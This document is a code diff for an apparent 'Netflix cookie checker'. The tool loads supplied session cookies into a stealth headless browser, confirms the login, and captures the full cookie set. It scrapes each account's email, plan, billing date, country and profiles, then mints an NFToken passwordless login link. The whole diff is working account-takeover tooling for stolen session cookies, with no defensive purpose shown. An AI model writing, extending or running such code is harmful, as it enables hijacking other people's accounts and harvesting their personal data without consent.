@@ -165,8 +165,8 @@ async def generate_nftoken(cookies: dict):
         return False, None, str(e)
 
 # --- Browser Cookie Enrichment (Playwright) ---
-async def get_browser_cookies(cookies: dict):
-    """Use headless browser to get full enriched cookies from Netflix session"""
+async def get_browser_data(cookies: dict):
+    """Use headless browser to get full cookies, email from /account/security, and account info"""
     try:
         from playwright.async_api import async_playwright
         async with async_playwright() as p:
@@ -188,10 +188,11 @@ async def get_browser_cookies(cookies: dict):
             await context.add_cookies(cookie_list)
 
             page = await context.new_page()
-
-            # Stealth: remove webdriver flag
             await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
 
+            info = {"email": None, "plan": None, "country": None, "member_since": None, "next_billing": None, "profiles": []}
+
+            # 1) Visit /browse to establish session and check login
             try:
                 await page.goto("https://www.netflix.com/browse", timeout=25000)
                 await page.wait_for_load_state("domcontentloaded", timeout=10000)
@@ -199,17 +200,84 @@ async def get_browser_cookies(cookies: dict):
             except Exception:
                 pass
 
-            # Get ALL cookies from browser session
+            url = page.url
+            if '/login' in url or '/LoginHelp' in url:
+                await browser.close()
+                return False, "", {}, info
+
+            # 2) Capture ALL browser cookies (Netflix sets SecureNetflixId, nfvdid, etc.)
             all_browser_cookies = await context.cookies()
             netflix_cookies = [c for c in all_browser_cookies if 'netflix' in c.get('domain', '').lower()]
             browser_cookies_str = '; '.join([f"{c['name']}={c['value']}" for c in netflix_cookies])
+            browser_cookies_dict = {c['name']: c['value'] for c in netflix_cookies}
+
+            # Detect country from URL
+            country_match = re.search(r'netflix\.com/([a-z]{2})/', url)
+            if country_match:
+                info['country'] = country_match.group(1).upper()
+
+            # 3) Visit /account/security to get email
+            try:
+                await page.goto("https://www.netflix.com/account/security", timeout=20000)
+                await page.wait_for_load_state("domcontentloaded", timeout=10000)
+                await page.wait_for_timeout(2000)
+                security_html = await page.content()
+
+                # Try to find email on the security page
+                email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', security_html)
+                if email_match:
+                    info['email'] = email_match.group(1)
+            except Exception as e:
+                logger.warning(f"Security page error: {e}")
+
+            # 4) Visit /YourAccount to get plan, billing, profiles
+            try:
+                await page.goto("https://www.netflix.com/YourAccount", timeout=20000)
+                await page.wait_for_load_state("domcontentloaded", timeout=10000)
+                await page.wait_for_timeout(2000)
+                account_html = await page.content()
+
+                # Extract from reactContext
+                ctx_match = re.search(r'reactContext\s*=\s*({.*?});', account_html, re.DOTALL)
+                if ctx_match:
+                    try:
+                        ctx = json.loads(ctx_match.group(1))
+                        models = ctx.get('models', {})
+                        user_info = models.get('userInfo', {}).get('data', {})
+                        if not info['email']:
+                            info['email'] = user_info.get('membershipEmail') or user_info.get('email')
+                        if not info['country']:
+                            info['country'] = user_info.get('countryOfSignup') or user_info.get('currentCountry')
+                        info['member_since'] = user_info.get('memberSince')
+                        plan_data = models.get('planInfo', {}).get('data', {})
+                        info['plan'] = plan_data.get('planName')
+                        info['next_billing'] = plan_data.get('nextBillingDate')
+                        profiles_data = models.get('profiles', {}).get('data', [])
+                        info['profiles'] = [pr.get('firstName', pr.get('profileName', 'Profile')) for pr in profiles_data if isinstance(pr, dict)]
+                    except Exception:
+                        pass
+
+                # Fallback email from account page
+                if not info['email']:
+                    m = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', account_html)
+                    if m:
+                        info['email'] = m.group(1)
+
+                # Fallback plan
+                if not info['plan']:
+                    for pl in ['Premium', 'Standard with ads', 'Standard', 'Basic', 'Mobile']:
+                        if pl.lower() in account_html.lower():
+                            info['plan'] = pl
+                            break
+            except Exception as e:
+                logger.warning(f"Account page error: {e}")
 
             await browser.close()
-            return browser_cookies_str
+            return True, browser_cookies_str, browser_cookies_dict, info
 
     except Exception as e:
-        logger.warning(f"Browser cookie enrichment failed: {e}")
-        return ""
+        logger.error(f"Browser data extraction failed: {e}")
+        return None, "", {}, {"email": None, "plan": None, "country": None, "member_since": None, "next_billing": None, "profiles": []}
 
 # --- Netflix Checker ---
 async def check_netflix_cookie(cookie_text, format_type="auto"):
@@ -241,107 +309,133 @@ async def check_netflix_cookie(cookie_text, format_type="auto"):
         "error": None
     }
 
-    # STEP 1: Try NFToken generation FIRST - most reliable validation
-    # If Netflix's own API returns a token, the cookie is 100% valid
-    nftoken_valid = False
+    browser_cookies_dict = {}
+
+    # STEP 1: Playwright - get browser cookies + email from /account/security + account info
     try:
-        success, nft, nft_err = await generate_nftoken(cookies)
+        is_logged_in, browser_cookies_str, browser_cookies_dict, info = await get_browser_data(cookies)
+
+        if is_logged_in:
+            result["status"] = "valid"
+            result["browser_cookies"] = browser_cookies_str
+            result["email"] = info.get("email")
+            result["plan"] = info.get("plan")
+            result["country"] = info.get("country")
+            result["member_since"] = info.get("member_since")
+            result["next_billing"] = info.get("next_billing")
+            result["profiles"] = info.get("profiles", [])
+            logger.info(f"Playwright: VALID | email={info.get('email')} | cookies={len(browser_cookies_dict)} keys")
+        elif is_logged_in is False:
+            logger.info("Playwright: session expired/login redirect")
+    except Exception as e:
+        logger.warning(f"Playwright failed: {e}")
+
+    # STEP 2: Generate NFToken using BROWSER cookies (they have SecureNetflixId etc.)
+    nftoken_cookies = browser_cookies_dict if browser_cookies_dict else cookies
+    try:
+        success, nft, nft_err = await generate_nftoken(nftoken_cookies)
         if success and nft:
             result["status"] = "valid"
             result["nftoken"] = nft
             result["nftoken_link"] = f"https://netflix.com/?nftoken={nft}"
-            nftoken_valid = True
-            logger.info("NFToken validation: VALID")
+            logger.info("NFToken: SUCCESS")
         else:
-            logger.info(f"NFToken validation failed: {nft_err}")
+            logger.info(f"NFToken failed: {nft_err}")
     except Exception as e:
-        logger.warning(f"NFToken generation error: {e}")
+        logger.warning(f"NFToken error: {e}")
 
-    # STEP 2: Use httpx to get account info (email, plan, country, etc.)
-    try:
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-        }
-        async with httpx.AsyncClient(follow_redirects=True, timeout=20.0) as http:
-            resp = await http.get(
-                'https://www.netflix.com/YourAccount',
-                cookies=cookies,
-                headers=headers
-            )
-            final_url = str(resp.url)
-            html = resp.text
-
-            # Only mark as expired if URL is explicitly a login page
-            is_login_page = any(x in final_url for x in ['/login', '/LoginHelp', '/Login'])
-
-            if not is_login_page:
-                # httpx also confirms valid
-                if not nftoken_valid:
-                    result["status"] = "valid"
-
-                # Parse account info from HTML
-                soup = BeautifulSoup(html, 'lxml')
-                for script in soup.find_all('script'):
-                    text = script.string or ''
-                    if 'reactContext' in text:
-                        match = re.search(r'reactContext\s*=\s*({.*?});', text, re.DOTALL)
-                        if match:
-                            try:
-                                ctx = json.loads(match.group(1))
-                                models = ctx.get('models', {})
-                                user_info = models.get('userInfo', {}).get('data', {})
-                                result['email'] = user_info.get('membershipEmail') or user_info.get('email')
-                                result['country'] = user_info.get('countryOfSignup') or user_info.get('currentCountry')
-                                result['member_since'] = user_info.get('memberSince')
-                                plan_info = models.get('planInfo', {}).get('data', {})
-                                result['plan'] = plan_info.get('planName')
-                                result['next_billing'] = plan_info.get('nextBillingDate')
-                                profiles_data = models.get('profiles', {}).get('data', [])
-                                result['profiles'] = [pr.get('firstName', pr.get('profileName', 'Profile')) for pr in profiles_data if isinstance(pr, dict)]
-                            except Exception:
-                                pass
-
-                # Detect country from URL
-                country_match = re.search(r'netflix\.com/([a-z]{2})/', final_url)
-                if country_match and not result['country']:
-                    result['country'] = country_match.group(1).upper()
-
-                # Fallback: email from HTML
-                if not result['email']:
-                    m = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', html)
-                    if m:
-                        result['email'] = m.group(1)
-
-                # Fallback: plan
-                if not result['plan']:
-                    for p in ['Premium', 'Standard with ads', 'Standard', 'Basic', 'Mobile']:
-                        if p.lower() in html.lower():
-                            result['plan'] = p
-                            break
-            else:
-                # httpx says login page - but NFToken might have already validated
-                if not nftoken_valid:
-                    result["status"] = "expired"
-                    result["error"] = "Cookie expired - redirected to login"
-
-    except Exception as e:
-        logger.warning(f"httpx check error: {e}")
-        if not nftoken_valid:
-            result["error"] = f"Check failed: {str(e)}"
-
-    # STEP 3: Try Playwright for browser cookie enrichment (only if valid, non-blocking)
-    if result["status"] == "valid":
+    # STEP 3: httpx fallback for account info if Playwright didn't get it
+    if result["status"] != "valid" or not result["email"]:
         try:
-            browser_cookies = await get_browser_cookies(cookies)
-            if browser_cookies:
-                result["browser_cookies"] = browser_cookies
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
+            }
+            httpx_cookies = browser_cookies_dict if browser_cookies_dict else cookies
+
+            async with httpx.AsyncClient(follow_redirects=True, timeout=20.0) as http:
+                # Try /account/security for email
+                if not result["email"]:
+                    try:
+                        sec_resp = await http.get(
+                            'https://www.netflix.com/account/security',
+                            cookies=httpx_cookies, headers=headers
+                        )
+                        sec_url = str(sec_resp.url)
+                        if '/login' not in sec_url:
+                            em = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', sec_resp.text)
+                            if em:
+                                result['email'] = em.group(1)
+                                if result["status"] != "valid":
+                                    result["status"] = "valid"
+                    except Exception:
+                        pass
+
+                # Try /YourAccount for plan, country etc
+                if not result["plan"] or not result["country"]:
+                    try:
+                        acc_resp = await http.get(
+                            'https://www.netflix.com/YourAccount',
+                            cookies=httpx_cookies, headers=headers
+                        )
+                        acc_url = str(acc_resp.url)
+                        if '/login' not in acc_url:
+                            if result["status"] != "valid":
+                                result["status"] = "valid"
+                            html = acc_resp.text
+                            soup = BeautifulSoup(html, 'lxml')
+                            for script in soup.find_all('script'):
+                                text = script.string or ''
+                                if 'reactContext' in text:
+                                    match = re.search(r'reactContext\s*=\s*({.*?});', text, re.DOTALL)
+                                    if match:
+                                        try:
+                                            ctx = json.loads(match.group(1))
+                                            models = ctx.get('models', {})
+                                            user_info = models.get('userInfo', {}).get('data', {})
+                                            if not result['email']:
+                                                result['email'] = user_info.get('membershipEmail') or user_info.get('email')
+                                            if not result['country']:
+                                                result['country'] = user_info.get('countryOfSignup') or user_info.get('currentCountry')
+                                            if not result['member_since']:
+                                                result['member_since'] = user_info.get('memberSince')
+                                            plan_info = models.get('planInfo', {}).get('data', {})
+                                            if not result['plan']:
+                                                result['plan'] = plan_info.get('planName')
+                                            if not result['next_billing']:
+                                                result['next_billing'] = plan_info.get('nextBillingDate')
+                                            if not result['profiles']:
+                                                profiles_data = models.get('profiles', {}).get('data', [])
+                                                result['profiles'] = [pr.get('firstName', pr.get('profileName', 'Profile')) for pr in profiles_data if isinstance(pr, dict)]
+                                        except Exception:
+                                            pass
+                            if not result['country']:
+                                cm = re.search(r'netflix\.com/([a-z]{2})/', acc_url)
+                                if cm:
+                                    result['country'] = cm.group(1).upper()
+                            if not result['email']:
+                                em = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', html)
+                                if em:
+                                    result['email'] = em.group(1)
+                            if not result['plan']:
+                                for p in ['Premium', 'Standard with ads', 'Standard', 'Basic', 'Mobile']:
+                                    if p.lower() in html.lower():
+                                        result['plan'] = p
+                                        break
+                        elif result["status"] != "valid":
+                            result["status"] = "expired"
+                            result["error"] = "Cookie expired - redirected to login"
+                    except Exception:
+                        pass
         except Exception as e:
-            logger.warning(f"Browser enrichment skipped: {e}")
+            logger.warning(f"httpx fallback error: {e}")
+
+    # If nothing validated the cookie
+    if result["status"] == "expired" and not result["error"]:
+        result["error"] = "Cookie expired or invalid"
 
     return result
 
